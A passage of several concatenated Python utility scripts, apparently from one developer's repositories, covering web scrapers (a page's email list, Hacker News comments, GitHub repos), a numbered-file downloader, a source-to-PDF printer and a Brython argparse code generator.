        uniq=args.uniq,
        number_of_downloaders=args.workers,
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import json

import httpkie
import dhtmlparser


# Variables ===================================================================
URL = "http://dfens-cz.com/chliv.php"


# Functions & classes =========================================================
def parse_emails(chlivek):
    dom = dhtmlparser.parseString(chlivek)

    email_tags = dom.find(
        "a",
        fn=lambda x: x.params.get("href", "").startswith("mailto:")
    )

    for email_tag in email_tags:
        nick = email_tag.getContent().strip()
        email = email_tag.params["href"].split("mailto:")[-1].strip()

        yield nick, email


def filter_emails(emails):
    return {
        email: nick
        for nick, email in emails
    }


# Main program ================================================================
if __name__ == '__main__':
    down = httpkie.Downloader()
    data = down.download(URL).decode("windows-1250").encode("utf-8")

    emails = parse_emails(data)
    emails = filter_emails(emails)

    print json.dumps(
        emails,
        sort_keys=True,
        indent=4,
        separators=(',', ': ')
    )
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#~ CountDownloader v1.0.2 (22.02.09) by bystrousak@seznam.cz.
#~ Created in SciTE text editor.
#~
#~ Notes:
    #~  
# imports
import sys
import urllib2
import os.path

# variables
argv= sys.argv
od= 0
do= 0
adr= ""
poc= -1
path= ""
errors= []

# functions & objects
def printHelp():
    print """
CountDownload.py --od 0 --do 10 http://www.adr.tld/?down=pic_00§count.jpg
            
        -o nebo --od
            Udava od kolika ma script pocitat. Pokud neni uveden, script ho
            automaticky nastavi na 0.
            
        -d nebo --do
            Udava do kolika ma script pocitat. Pokud neni uveden, script ho
            automaticky nastavi na 0.
            
        -p nebo --poc
            Udava pocet nul, ktere budou pridany pred promennou §count. 
            Standardne §count nabira hodnot 0, 1, 2, .. S parametrem -p 3 bude
            nabirat hodnot 000, 001, 002, 003 atd..
            
        --path
            Udava relativni cestu ke slozce do ktere budou ukladany vysledky.
            
        adresa zacinajici http://
            Specifikuje adresu ze ktere bude stazen soubor. Promenna §count
            specifikuje mista v adrese, ktera budou nahrazena cisly od
            --od do --do.
"""
    exit()
    
    
# main program
try:
    if len(argv)>1:
        for i in range(len(argv)):              # nacteni argumentu
            if argv[i].startswith("http://"):
                adr= argv[i]
            elif argv[i].startswith("--od") or argv[i].startswith("-o"):
                od= int(argv[i+1])
            elif argv[i].startswith("--do") or argv[i].startswith("-d"):
                do= int(argv[i+1])
            elif argv[i].startswith("--poc") or argv[i].startswith("-p"):
                poc= int(argv[i+1])
            elif argv[i].startswith("--path"):
                path= argv[i+1]
            elif argv[i].startswith("--help") or argv[i].startswith("-h"):
                raise RuntimeError, "Help.."
                
    if od > do:
        print "--od musi byt mensi nez --do !"
        raise RuntimeError, "--od musi byt mensi nez --do !"
    elif adr == "":
        print "Nespecifikoval jsi adresu!"
        raise RuntimeError, "Nespecifikoval jsi adresu!"
except:
    printHelp()
    sys.exit()


print "CountDownloader v1.0.0 (22.02.09) by bystrousak@seznam.cz."
print
print "Zacinam stahovat;"
print

adr= adr.split("§count")
for i in range(do-od+1):
    if poc == -1:                           # pokud je nastaven -p, tak pridava 0 pred cisla
        num= i + od
    else:
        if len(str(i)) < poc:
            num= ((poc-len(str(i+od))) * "0") + str(i + od)
        else:
            num= i + od
    url= str(num).join(adr)
    
    name= os.path.basename(url)
    name= name.split("?")[-1]
    name= name.split("=")[-1]
    
    if path != "":
        name= path + "/" + name 
    
    try:
        print "\tNacitam", url, "..",
        fp= urllib2.urlopen(url)
        data= fp.read()
        fp.close()
    except:
        print "Chyba!"
        errors.append("Soubor "+ url+ " se nepodarilo stahnout!")
    print "ok"
    
    try:
        print "\tZapisuji soubor", name, "..",
        file= open(os.path.normpath(name), "wb")
        file.write(data)
        file.close()
    except IOError, e:
        print "Chyba!"
        print e
        errors.append("Soubor "+ url+ " se nepodarilo ulozit!")
    print "ok"

if len(errors) > 0:
    print
    print 80 * "-"
    print
    print "Byly zaznamenany tyto chyby;" 
    print
    for i in errors:
        print "\t", i
else:
    print
    print "Stahovani probehlo bez chyb."#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#~ CountDownloader v1.0.4 (24.02.09) by bystrousak@seznam.cz.
#~ Created in SciTE text editor.
#~
#~ Notes:
    #~  
# imports
import sys
import urllib2
import os.path

# variables
argv= sys.argv
od= 0
do= 0
adr= ""
poc= -1
path= ""
errors= []

# functions & objects
def printHelp():
    print """
CountDownload.py --od 0 --do 10 http://www.adr.tld/?down=pic_00{counter}.jpg
            
        -o nebo --od
            Udava od kolika ma script pocitat. Pokud neni uveden, script ho
            automaticky nastavi na 0.
            
        -d nebo --do
            Udava do kolika ma script pocitat. Pokud neni uveden, script ho
            automaticky nastavi na 0.
            
        -p nebo --poc
            Udava pocet nul, ktere budou pridany pred promennou §count. 
            Standardne {counter} nabira hodnot 0, 1, 2, .. S parametrem -p 3 
            bude nabirat hodnot 000, 001, 002, 003 atd..
            
        --path
            Udava relativni cestu ke slozce do ktere budou ukladany vysledky.
            
        adresa zacinajici http://
            Specifikuje adresu ze ktere bude stazen soubor. Promenna {counter}
            specifikuje mista v adrese, ktera budou nahrazena cisly od
            --od do --do.
"""
    exit()
    
    
# main program
try:
    if len(argv)>1:
        for i in range(len(argv)):              # nacteni argumentu
            if argv[i].startswith("http://"):
                adr= argv[i]
            elif argv[i].startswith("--od") or argv[i].startswith("-o"):
                od= int(argv[i+1])
            elif argv[i].startswith("--do") or argv[i].startswith("-d"):
                do= int(argv[i+1])
            elif argv[i].startswith("--poc") or argv[i].startswith("-p"):
                poc= int(argv[i+1])
            elif argv[i].startswith("--path"):
                path= argv[i+1]
            elif argv[i].startswith("--help") or argv[i].startswith("-h"):
                raise RuntimeError, "Help.."
                
    if od > do:
        print "--od musi byt mensi nez --do !"
        raise RuntimeError, "--od musi byt mensi nez --do !"
    elif adr == "":
        print "Nespecifikoval jsi adresu!"
        raise RuntimeError, "Nespecifikoval jsi adresu!"
except:
    printHelp()
    sys.exit()


print "CountDownloader v1.0.4 (24.02.09) by bystrousak@seznam.cz."
print
print "Zacinam stahovat;"
print

adr= adr.split("{counter}")
for i in range(do-od+1):
    if poc == -1:                           # pokud je nastaven -p, tak pridava 0 pred cisla
        num= i + od
    else:
        if len(str(i)) < poc:
            num= ((poc-len(str(i+od))) * "0") + str(i + od)
        else:
            num= i + od
    url= str(num).join(adr)
    
    name= os.path.basename(url)
    name= name.split("?")[-1]
    name= name.split("=")[-1]
    
    if path != "":
        name= path + "/" + name 
    
    try:
        print "\tNacitam", url, "..",
        fp= urllib2.urlopen(url)
        data= fp.read()
        fp.close()
        print "ok"
    except:
        print "Chyba!"
        data= "err"
        errors.append("Soubor "+ url+ " se nepodarilo stahnout!")

    if data!= "err":
        try:
            print "\tZapisuji soubor", name, "..",
            file= open(os.path.normpath(name), "wb")
            file.write(data)
            file.close()
            print "ok"
        except IOError, e:
            print "Chyba!"
            print e
            errors.append("Soubor "+ url+ " se nepodarilo ulozit!")

if len(errors) > 0:
    print
    print 80 * "-"
    print
    print "Byly zaznamenany tyto chyby;" 
    print
    for i in errors:
        print "\t", i
else:
    print
    print "Stahovani probehlo bez chyb."#! /usr/bin/env python3
import argparse
from collections import namedtuple

import dhtmlparser
import requests


class Comment(namedtuple("Comment", "author text")):
    pass


def download_and_parse(url):
    data = requests.get(url).text
    data = data.replace("<div class='reply'>", '</span></div></div></div>')
    dom = dhtmlparser.parseString(data)

    return dom


def iterate_comments(dom):
    comment_tree = dom.find("table", {"class": 'comment-tree'})

    for comment_html in comment_tree[0].find("tr"):
        if not comment_html.find("table"):
            continue

        text = comment_html.find("div", {"class": "comment"})
        if text:
            spans = text[0].find("span")
            for span in spans:
                if not span.getContent().strip():
                    span.replaceWith(dhtmlparser.parseString(""))

            text = spans[0].getContent()
        else:
            continue

        user = comment_html.find("a", {"class": "hnuser"})
        if user:
            user = user[0].getContent()
        else:
            continue
            user = "unknown"

        yield Comment(user, text)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "URL",
        help="URL of the hackernews comments."
    )

    args = parser.parse_args()

    for comment in iterate_comments(download_and_parse(args.URL)):
        print("<p>")
        print("<h5>%s</h5>" % comment.author)
        print(comment.text)
        print("</p>")
        print("<hr />")
        print()#! /usr/bin/env python3
import os
import os.path
import time
import shutil
import fnmatch
import argparse
import tempfile
from contextlib import contextmanager

import sh


@contextmanager
def get_tmp_dir():
    dir_path = tempfile.mkdtemp()

    yield dir_path

    shutil.rmtree(dir_path)


@contextmanager
def cwd_to_path(path):
    cwd = os.getcwd()

    yield os.chdir(path)

    os.chdir(cwd)


def generate_head_page(tmp_dir, project_name):
    head_page_path = os.path.join(tmp_dir, "head_page.ps")
    with open(head_page_path, "w") as f:
        f.write("""%%!
%% Example 3

/Times-Roman findfont
30 scalefont
setfont

newpath
150 600 moveto
(%s) show

newpath
150 565 moveto
(source code) show

/Times-Roman findfont
20 scalefont
setfont

newpath
150 520 moveto
(Generated %s) show

showpage""" % (project_name, time.strftime("%Y-%m-%d %H:%M:%S")))

    return head_page_path


def main(project_path, ignore_patterns):
    generator = py_files_walker(project_path)
    if ignore_patterns:
        generator = filter_patterns(generator, ignore_patterns, project_path)

    project_name = os.path.basename(project_path)
    ps_name = project_name + ".ps"
    pdf_name = project_name + ".pdf"

    with get_tmp_dir() as tmp_dir:
        with cwd_to_path(project_path + "/.."):
            ps_files = [convert_to_ps(project_path, tmp_dir, path)
                        for path in generator]

        ps_files.insert(0, generate_head_page(tmp_dir, project_name))
        join_multiple_ps_files(ps_name, ps_files)

    convert_ps_to_pdf(ps_name, pdf_name)


def py_files_walker(path):
    for root, dirs, fns in os.walk(path):
        for fn in fns:
            path = os.path.join(root, fn)

            if not path.endswith(".py"):
                continue

            yield os.path.relpath(path)


def filter_patterns(paths_generator, ignore_patterns, project_path):
    for path in paths_generator:
        rel_path = path.replace(project_path, "", 1)
        if rel_path.startswith("/"):
            rel_path = rel_path[1:]

        matched = False
        for pattern in ignore_patterns:
            if fnmatch.fnmatch(rel_path, pattern):
                matched = True

        if not matched:
            yield path


def convert_to_ps(project_path, outdir, path):
    ps_path = os.path.join(outdir, path.replace("/", "_") + ".ps")
    sh.enscript("-Epython", "--line-numbers", "--highlight=python", "-p",
                ps_path, path)

    print("Converted", path)

    return ps_path


def join_multiple_ps_files(out_path, ps_files):
    sh.psmerge("-o" + out_path, *ps_files)


def convert_ps_to_pdf(ps_path, pdf_path):
    sh.ps2pdf(ps_path, pdf_path)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
            "PROJECT_PATH",
            help="Path to the root of the project with python files."
    )
    parser.add_argument(
            "-i",
            "--ignore",
            help="Pattern to ignore.",
            nargs="+"
    )

    args = parser.parse_args()

    main(args.PROJECT_PATH, args.ignore)
#! /usr/bin/env python3
import sys

import dhtmlparser


def emit_clean_html(dom):
    for a in dom.find("a"):
        for param in a.params.keys():
            if param not in {"href", "alt"}:
                del a.params[param]

    tag_types = []
    for tag_name in ("h1", "h2", "h3", "pre", "code", "div"):
        tag_types.extend(dom.find(tag_name))

    for item in tag_types:
        for param in item.params.keys():
            del item.params[param]

    return dom.prettify()


if __name__ == '__main__':
    with open(sys.argv[1]) as f:
        dom = dhtmlparser.parseString(f.read())

    print(emit_clean_html(dom))
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#


# Functions & objects =========================================================
def horizontal_skill_str(skill_dict, reverse=False, sort=False, rev_sort=False):
    """
    Print horizontal skill list.

    Args:
        skill_dict (dict): Dictionary in form {skill_name: num} - {"C++": 3}.
        reverse (bool, default False): Normally, skill is written as "C++ ***",
                this parameter reverses it to "*** C++".
        sort (boo, defalut False): Sort skill by skill value.
        rev_sort: Reverse the sort of the skill value.

    Returns:
        str: String with printed skills.
    """
    max_val = max(skill_dict.values())
    max_skill_len = max(skill_dict.values())

    items = skill_dict.items()
    if sort:
        items = sorted(items, key=lambda x: x[1], reverse=rev_sort)

    out = []
    for name, val in items:
        spacer = (max_skill_len - len(name) + 2) * " "
        value = val * "*"
        end_spacer = (max_val - val) * " "

        line = [name, spacer, value, end_spacer]

        if reverse:
            line = reversed(line)

        out.append("".join(line))

    return "\n".join(out)


def vertical_skill_str(skill_dict, reverse=False, sort=False, rev_sort=False):
    """
    Print vertical skill list.

    Args:
        skill_dict (dict): Dictionary in form {skill_name: num} - {"C++": 3}.
        reverse (bool, default False): Normally, skill is written as "C++ ***",
                this parameter reverses it to "*** C++".
        sort (boo, defalut False): Sort skill by skill value.
        rev_sort: Reverse the sort of the skill value.

    Returns:
        str: String with printed skills.
    """
    max_val = max(skill_dict.values())

    items = skill_dict.items()
    if sort:
        items = sorted(items, key=lambda x: x[1], reverse=rev_sort)

    out = []
    for name, val in items:
        spacer = len(name) * " "

        value = list(spacer)
        value[len(spacer) / 2] = "*"
        value = ["".join(value)] * val

        end_spacer = (max_val - val) * [spacer]

        line = [name] + [spacer] + value + end_spacer
        if reverse:
            line = list(reversed(line))

        out.append(line)

    real_out = []
    for i in range(max_val + 2):
        line = " ".join([x[i] for x in out])
        real_out.append(line)

    return "\n".join(real_out)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys
import os.path
import argparse
from string import Template

import xmltodict


# Variables ===================================================================


# Functions & objects =========================================================
def check_existence(fn, is_dir=False):
    if not fn:
        return

    if not os.path.exists(fn):
        sys.stderr.write("Can't find '%s'!\n" % fn)
        sys.exit(1)

    if not is_dir and os.path.isdir(fn):
        sys.stderr.write("'%s' is directory, but file is required!\n" % fn)
        sys.exit(1)


def generate_page(xml_file, template_file, static_dir):
    check_existence(xml_file)
    check_existence(template_file)
    check_existence(static_dir, is_dir=True)

    # read xml
    with open(xml_file) as f:
        xml = xmltodict.parse(f.read())

    print xml



# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="Generator of the 'about me' page for my website."
    )
    parser.add_argument(
        dest="filename",
        help="Specify the file containing 'user.xml'. Use - for stdin."
    )
    parser.add_argument(
        "-u",
        "--user-xml",
        metavar="XML",
        required=True,
        help="Path to the XML file with user data."
    )
    parser.add_argument(
        "-t",
        "--template",
        required=True,
        help="Path to the template."
    )
    parser.add_argument(
        "-s",
        "--static",
        metavar="FILES",
        help="""Path to the directory with static files. Static files are
                copied to output directory, if specified."""
    )
    args = parser.parse_args()

    generate_page(args.user_xml, args.template, args.static)
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ".2012"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # Argparse, zohlednit globální xml soubor
#= Imports =====================================================================
import sys
import json
import urllib



#= Variables ===================================================================
url           = "https://api.github.com/users/$user$/repos"
user          = "Bystroushaak"
github_url    = "http://github.com/" + user
user_url      = url.replace("$user$", user)
max_cnt       = 5

item_template = """
  <tr><td>
    <a href='$url$' id='url'><h3 style='margin-bottom: 0px; margin-top: 10px;' id='name'>$name$</h3></a>
    <span id="item_descr">$descr$</span>
  </td></tr>
"""
more_template   = """  <tr><td style='padding-top: 10px;'><a href='$github_url$'>and $more$ more..</a></td></tr>"""
github_template = """
<table width=650px id='github'>
<tr><td><h2 style='margin-bottom: 0px;'><a href='$github_url$'>Github</a></h2></td></tr>

$items_templ$

$more_templ$

</table>
"""


#= Functions & objects =========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")


def templater(s, replaces):
	for orig, repl in replaces:
		s = s.replace(orig, repl)

	return s



#= Main program ================================================================
if __name__ == '__main__':
	# download information about user's repositories
	try:
		h = urllib.urlopen(user_url)
		data = h.read()
		h.close()
	except Exception, e:
		writeln("Can't connect to github!", sys.stderr)
		writeln(str(e), sys.stderr)
		sys.exit(1)

	data = sorted(json.loads(data), key=lambda x: x["updated_at"])
	data.reverse()

	# process repositories
	cnt = 0
	items = ""
	for item in data:
		if item["description"].strip() == "":
			item["description"] = "No description available."

		s_item = templater(item_template,
			[
				["$name$",  item["name"]],
				["$url$",   item["html_url"]],
				["$descr$", item["description"]]
			]
		)

		if cnt < max_cnt:
			items += s_item
		cnt += 1

	# apply variables to templates
	out = templater(github_template, 
		[
			["$more_templ$",   more_template],
			["$github_url$",   github_url],
			["$more$",         str(cnt - max_cnt)],
			["$items_templ$",  items]
		]
	)

	writeln(out)

#! /usr/bin/env python3
#
# Interpreter version: brython
#
from browser import document as doc


def type_on_change_event(self, ev):
    """
    This code switches select for input when user selects `Custom` in
    `type` select element.
    """
    if ev.target.value == "custom":
        ID = self.element.id
        new_html = '<input id="%s" type="text" _non_str="true" ' % ID
        new_html += '_non_key="" _default="" />'
        ev.target.outerHTML = new_html

        self.element = doc[ID]


def action_on_change_event(self, ev):
    """
    Event raised when user changes value in `action` input.
    """
    bool_switches = [
        "count",
        "store_true",
        "store_false",
        "help",
        "version"
    ]
    bool_disables = [
        "type",
        "const",
        "nargs",
        "choices",
        "default",
        "metavar"
    ]

    # enable/disable other inputs
    disabled = (ev.target.value in bool_switches)
    disabled_inputs = [self.parent.inputs[x] for x in bool_disables]

    for item in disabled_inputs:
        item.disabled = disabled


class ArgInput:
    """
    This class is used to wrap <input>, <select> and <textarea> HTML elements.

    It provides unified setters and getters for those elements, allows to
    define callbacks when clicked/changed, switch two :class:`ArgInput`
    objects, serialize them to string, enable/disable them and so on.

    Attr:
        ID (str): Unique ID. Thanks to this, objects know which HTML elements
                  belong to them.
        name (str): Name of the argparse argument - `descr`, `type` and so on.
        color (str): Default color for input text.
        parent (str): Pointer to :class:`Argument`, where this object is
                      stored. This can be used to disable other inputs and so
                      on.
        element (obj): Pointer to HTML element.
        is_text_type (bool): True for inputs/textareas, false for select,
                             checkboxes and others.
        wrapped_value (str): Value used when element is serialized to python.
        value (str): Clean value of the element.
        disabled (bool): Property which allows to enable/disable HTML element.
    """
    def __init__(self, element, parent):
        self.ID = element.id.split("_")[0]
        self.name = element.id.split("_")[-1]
        self.color = "gray"

        self.parent = parent
        self.element = element  # reference to html object

        if self.element.value == "":
            self.element.value = self.element.title
            self.element.style.color = self.color

        if self.is_text_type:
            element.bind("focus", self.input_remove_help_callback)
            element.bind("blur", self.input_add_help_callback)
        elif element.nodeName == "SELECT":
            element.bind("change", self.on_change_callback)

        self.on_change_events = {
            "type": type_on_change_event,
            "action": action_on_change_event
        }

    def on_change_callback(self, ev):
        """
        Callback called every time the select HTML element is changed.
        """
        func = self.on_change_events.get(self.name, None)

        if func:
            func(self, ev)

    def input_remove_help_callback(self, ev):
        """
        Called when user clicks to the input/textarea element to remove help.
        """
        if ev.target.value == ev.target.title:
            ev.target.value = ""
            ev.target.style.color = "black"

    def input_add_help_callback(self, ev):
        """
        Called every time user removes focus from input element to restere
        help, if the input is blank.
        """
        if ev.target.value == "":
            ev.target.value = ev.target.title
            ev.target.style.color = self.color

    @property
    def wrapped_value(self):
        """
        Property to wrap the internal raw value to string.

        This is used for string serialization - some of the elements needs to
        add quotes, some have default values and so on.
        """
        if self.disabled:
            return None

        # selects
        if not self.is_text_type and \
           self.element.value == self.element._default:
            return None

        # checkboxes
        if self.element.type == "checkbox":
            value = self.element.checked

            if self.element._default == str(value):
                return None

            return value

        # text elements - textearea/input
        if self.element.value != self.element.title:
            # nargs are strings only in some special cases (+*?)
            if self.name == "nargs" and self.element.value in "+*?":
                return '"%s"' % self.element.value

            if self.element._non_str.strip():
                return self.element.value

            return self._wrap_strings()

        return None

    def _wrap_strings(self):
        def wrap(text, first_wrap, other_wraps, other_indents, line_len=79):
            """
            Wrap `text` after `first_wrap` chars and then every `other_wraps`
            characters.

            Args:
                text (str): Text which will be wrapped.
                first_wrap (int): Perform first wrap after `first_wrap`
                    characters.
                other_wraps (int): Wrap other lines after `other_wraps`
                    characters.

            Returns:
                list: List of strings wrapped after `first_wrap` and \
                      `other_wraps`.
            """
            out = []

            if len(text) <= line_len:
                return text

            # first wrap
            out.append(text[:first_wrap])
            text = text[first_wrap:]

            # other wraps
            while len(text) > other_wraps:
                out.append(other_indents + text[:other_wraps])
                text = text[other_wraps:]

            return "\\\n".join(out + [other_indents + text])

        val = self.element.value.replace(r"\\", r"\\")  # don't even ask

        # use """ for multiline strings
        quote = '"'
        argument_len = len((4 * " ") + self.name + "=" + quote + val + quote)
        MAX_LINELEN = 79
        if "\n" in val or argument_len >= MAX_LINELEN:
            quote = quote * 3

        # escape quotes in string
        if quote in val:
            val = val.replace(quote, quote.replace('"', '\\"'))

        # can fit to one line?
        first_indentation = "    %s=%s" % (self.name, quote)
        if len(first_indentation + val + quote) <= MAX_LINELEN:
            return quote + val + quote

        # wrap long lines
        val = wrap(
            text=quote + val,
            first_wrap=MAX_LINELEN - len(first_indentation),
            other_wraps=MAX_LINELEN - len(first_indentation),
            other_indents=len(first_indentation) * " ",
            line_len=MAX_LINELEN,
        )
        return val + quote

    @property
    def value(self):
        """
        Property to access value of the HTML element.
        """
        if self.element.type == "checkbox":
            return self.element.checked

        return self.element.value

    @value.setter
    def value(self, new_val):
        """
        Property to set value of the HTML element.
        """
        if self.element.type == "checkbox":
            self.element.checked = new_val
        else:
            self.element.value = new_val

    @property
    def is_text_type(self):
        """
        Getter showing whether the ArgInput object wraps text element or
        switch/checkbox.
        """
        return (self.element.type == "text" or
                self.element.nodeName == "TEXTAREA")

    @property
    def disabled(self):
        """
        Abstration over disabled property.
        """
        return self.element.disabled

    @disabled.setter
    def disabled(self, val):
        """
        Setteer for diabled property.
        """
        self.element.disabled = val

    def switch(self, inp2):
        """
        Switch two ArgInput objects.

        Switch values, if the objects are of the same type, or whole HTML
        elements, if they are different types.

        Args:
            inp2 (object): :class:`ArgInput` class.
        """
        inp1 = self

        el1, el2 = inp1.element, inp2.element
        el1.style.color, el2.style.color = el2.style.color, el1.style.color

        if inp1.element.nodeName != inp2.element.nodeName:
            val1, val2 = inp1.value, inp2.value
            el1.id, el2.id = el2.id, el2.id
            el1.outerHTML, el2.outerHTML = el2.outerHTML, el2.outerHTML

            inp1.element = doc[inp1.ID + "_argument_" + inp1.name]
            inp2.element = doc[inp2.ID + "_argument_" + inp2.name]
            inp1.value, inp2.value = val2, val1
        else:
            inp1.value, inp2.value = inp2.value, inp1.value

    def __str__(self):
        if self.element._non_key:
            return str(self.wrapped_value)

        return self.name + "=" + str(self.wrapped_value)

    def __hash__(self):
        return hash(self.ID)
#! /usr/bin/env python3
#
# Interpreter version: brython
#

from .arginput import ArgInput
from .argument import Argument
from .argument import bind_links
#! /usr/bin/env python3
#
# Interpreter version: brython
#
from collections import OrderedDict

from browser import html
from browser import document as doc

from .arginput import ArgInput


# Variables ===================================================================
_ARG_COUNTER = range(100000).__iter__()  # argument table ID pool
ARG_TEMPLATE = """parser.add_argument(
\t$parameters
)
"""


def get_id_from_pool():
    """
    Returns:
        int: Incremented ID from previous call.
    """
    return _ARG_COUNTER.__next__()


def show_help_frame(ev):
    """
    Add help popup to the HTML.
    """
    src = '<iframe id="white_content" src="' + ev.target.fhref + '"></iframe>'

    doc["help_placeholder"].innerHTML = src
    doc["black_overlay"].style.display = "inline"
    doc["white_content"].style.display = "inline"


def bind_links(container):
    """
    Bind all links in given `container` to popup help/iframe.

    Note:
        This function can be called only once for each link, or it wouln't
        work.
    """
    # bind all links to show popup with help
    for el in container.get(selector="a"):
        el.fhref = el.href
        el.href = "#"
        el.bind("click", show_help_frame)


class Argument:
    """
    This object is used to represent sets of :class:`ArgInput` objects, in
    order as they are defined in <span> with ID `arguments`.

    It can also :func:`remove` itself from the HTML page and serialize content
    of the inputs to python code.

    Attr:
        ID (str): Unique ID. Thanks to this, objects know which HTML elements
                  belong to them.
        element (obj): Pointer to corresponding HTML table with inputs.
        inputs (ordered dict): Dictionary with HTML inputs stored in format
               ``{"$NAME": el_reference}`` where ``$NAME`` is last part of
               HTML `id` splitted by ``_``.
    """
    def __init__(self):
        self.ID = str(get_id_from_pool())
        self.element = self._add_html_repr()

        arguments = self.element.get(selector="input")
        arguments = [x for x in arguments if x.type != "button"]
        arguments.extend(self.element.get(selector="select"))
        arguments.extend(self.element.get(selector="textarea"))

        self.inputs = OrderedDict(
            (x.id.split("_")[-1], ArgInput(element=x, parent=self))
            for x in arguments if x
        )

        bind_links(self.element)

    def _add_html_repr(self):
        """
        Add HTML representation of the argument to the HTML page.
        """
        template = doc["argument_template"].innerHTML

        table = html.TABLE(id=self.ID + "_argument", Class="argument_table")
        table.html = template.replace("$ID", self.ID)
        doc["arguments"] <= table

        return table

    def remove(self):
        """
        Remove argument from HTML.
        """
        doc[self.ID + "_argument"].outerHTML = ""

    def switch(self, arg2):
        """
        Switch all values in this Argument with `arg2`.
        """
        assert isinstance(arg2, Argument)

        for key in self.inputs.keys():
            self.inputs[key].switch(arg2.inputs[key])

    def __str__(self):
        # collect strings from all inputs
        vals = [
            str(x)
            for x in self.inputs.values()
            if x.wrapped_value is not None
        ]

        if not vals:
            return ""

        return ARG_TEMPLATE.replace(
            "$parameters",
            ",\n\t".join(vals)
        )
#! /usr/bin/env python3
#
# Interpreter version: brython
#
from collections import OrderedDict

from browser import document as doc

from components import ArgInput
from components import Argument
from components import bind_links


# Functions & objects =========================================================
def hide_help_frame(ev):
    """
    Remove help popup from the HTML.
    """
    doc["help_placeholder"].innerHTML = ""
    doc["black_overlay"].style.display = "none"


def parse_arguments(ev):
    """
    Parse arguments from inputs and save the result to the output textarea.
    """
    text = a.__str__()

    if doc["output_use_spaces"].checked:
        text = text.replace("\t", "    ")

    doc["output"].value = text


# Object definitions ==========================================================
class ArgParser:
    """
    This object holds references to all argument tables and global argparse
    settings.

    Attr:
        arguments (ordered dict): References to :class:`Argument` objects.
        element (obj): Reference to `argument_parser` <span>.
        inputs (ordered dict): Reference to global settings inputs.
    """
    def __init__(self):
        self.arguments = OrderedDict()
        self.add_argument_callback()

        # parse all inputs belonging to the argparser objects
        self.element = doc["argument_parser"]
        arguments = self.element.get(selector="input") or []
        arguments.extend(self.element.get(selector="textarea") or [])

        self.inputs = OrderedDict(
            (x.id.split("_")[-1], ArgInput(element=x, parent=self))
            for x in arguments if x
        )

    def new_argument(self):
        """
        Create new :class:`Argument` object and bind events to the buttons.

        Returns:
            Argument object: Created object.
        """
        arg = Argument()
        self.bind_argument(arg)
        return arg

    def bind_argument(self, argument):
        """
        Bind buttons in `argument` object to callbacks methods in this object.
        """
        doc[argument.ID + "_argument_button_add"].bind(
            "click",
            self.add_argument_callback
        )
        doc[argument.ID + "_argument_button_rm"].bind(
            "click",
            self.remove_argument_callback
        )
        doc[argument.ID + "_argument_button_up"].bind(
            "click",
            self.move_arg_up_callback
        )
        doc[argument.ID + "_argument_button_down"].bind(
            "click",
            self.move_arg_down_callback
        )

    def add_argument_callback(self, ev=None):
        """
        Add new argument into HTML representation and internal dict.

        Note:
            This method is called asynchronously, when the button is pressed.
        """
        arg = self.new_argument()
        self.arguments[arg.ID] = arg

    def remove_argument_callback(self, ev=None):
        """
        Remove argument from HTML representation and internal dict.

        ID of the argument is parsed from `ev` parameter.

        Note:
            This method is called asynchronously, when the button is pressed.
        """
        if len(self.arguments) > 1:
            ID = ev.target.id.split("_")[0]
            self.arguments[ID].remove()
            del self.arguments[ID]

    def move_arg_up_callback(self, ev):
        """
        Switch two arguments - move the argument where the button was pressed
        down.

        Note:
            This method is called asynchronously, when the button is pressed.
        """
        ID = ev.target.id.split("_")[0]
        keys = list(self.arguments.keys())
        ioa = keys.index(ID)

        if len(self.arguments) > 1 and ioa > 0:
            arg1 = self.arguments[keys[ioa]]
            arg2 = self.arguments[keys[ioa - 1]]

            arg1.switch(arg2)

    def move_arg_down_callback(self, ev=None):
        """
        Switch two arguments - move the argument where the button was pressed
        down.

        Note:
            This method is called asynchronously, when the button is pressed.
        """
        ID = ev.target.id.split("_")[0]
        keys = list(self.arguments.keys())
        ioa = keys.index(ID)

        if len(self.arguments) > 1 and ioa < len(self.arguments) - 1:
            arg1 = self.arguments[keys[ioa]]
            arg2 = self.arguments[keys[ioa + 1]]

            arg1.switch(arg2)

    def __str__(self):
        # read value of all inputs in this object, pick only inputs with value
        vals = [
            str(x)
            for x in self.inputs.values()
            if x.wrapped_value is not None
        ]

        # add \n\t only if there are used inputs
        inp_string = ",\n\t".join(vals)
        if inp_string:
            inp_string = "\n\t" + inp_string + "\n"

        # put inputs to template
        ARG_PARSER_TEMPLATE = """import argparse

# ...
parser = argparse.ArgumentParser($parameters)
$arguments
args = parser.parse_args()

"""
        out = ARG_PARSER_TEMPLATE.replace("$parameters", inp_string)

        # convert arguments to strings
        arguments = ""
        for item in self.arguments.values():
            arguments += item.__str__()

        # put arguments to template
        return out.replace("$arguments", arguments)


# Main program ================================================================
if __name__ == '__main__':
    a = ArgParser()

    # bind click on output textarea with generation of the source code
    doc["output"].bind("click", parse_arguments)
    doc["output_use_spaces"].bind("click", parse_arguments)

    # bind links with popup help
    doc["black_overlay"].bind("click", hide_help_frame)
    bind_links(doc["argument_parser"])

    doc["loading_gears_background"].style.display = "none"#! /usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Imports =====================================================================
import sys
import random


# Variables ===================================================================
VOWELS = list("aeiouáéíóúůyý")


# Functions & classes =========================================================
def get_words(filename):
    if filename == "-":
        return sys.stdin.read().splitlines()

    with open(filename) as f:
        return f.read().splitlines()


def split_word(word):
    size = len(word)

    def pick_random_part(word, j, k):
        if random.randint(0, 2) != 0:
            j = min([j, k])
            k = max([j, k])

        return word[j:k]

    splits = [
        pick_random_part(
            word,
            random.randint(0, size),
